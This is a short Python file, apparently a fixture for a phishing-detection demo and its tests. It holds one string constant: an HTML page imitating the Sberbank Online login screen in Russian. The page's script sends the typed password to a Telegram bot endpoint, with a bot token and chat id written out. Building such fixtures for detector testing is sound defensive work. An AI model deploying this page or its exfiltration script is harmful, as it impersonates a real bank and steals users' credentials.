"""Synthetic phishing kit used by UI demo case 3 and tests."""

TELEGRAM_KIT = """<html><head><title>Сбербанк Онлайн — вход</title></head><body>
<h1>СберБанк Онлайн</h1>
<form id="f"><input type="text" name="login" placeholder="Логин"><input type="password" id="p" name="password">
<button type="submit">Войти</button></form>
<script>document.getElementById('f').onsubmit=function(){fetch("https://api.telegram.org/bot7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage?chat_id=-100123456&text="+document.getElementById('p').value);return false;}</script>
</body></html>"""
